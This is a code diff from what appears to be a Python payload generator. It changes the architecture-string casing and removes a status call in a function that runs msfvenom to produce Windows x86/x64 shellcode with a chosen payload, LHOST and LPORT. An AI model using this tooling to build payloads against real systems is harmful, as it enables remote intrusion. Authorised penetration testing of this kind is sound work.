@@ -4,7 +4,7 @@ import subprocess
 
 
 def SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT):
-    if ARCHITECTURE == "X86":
+    if ARCHITECTURE == "x86":
         MSFVENOM = ['msfvenom', '-a', 'x86', '--platform', 'windows', '-p', PAYLOAD, LHOST, LPORT, '-f', 'c']
         core.GENERATING_SHELLCODE()
         SHELLCODE = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -12,9 +12,8 @@ def SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT):
         SHELLCODE = UNNECESSARY_CHARACTERS(SHELLCODE)
         return SHELLCODE
 
-    elif ARCHITECTURE == "X64":
+    elif ARCHITECTURE == "x64":
         MSFVENOM = ['msfvenom', '-a', 'x64', '--platform', 'windows', '-p', PAYLOAD, LHOST, LPORT, '-f', 'c']
-        core.GENERATING_SHELLCODE()
         SHELLCODE = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
         core.SHELLCODE_GENERATED()
         SHELLCODE = UNNECESSARY_CHARACTERS(SHELLCODE)
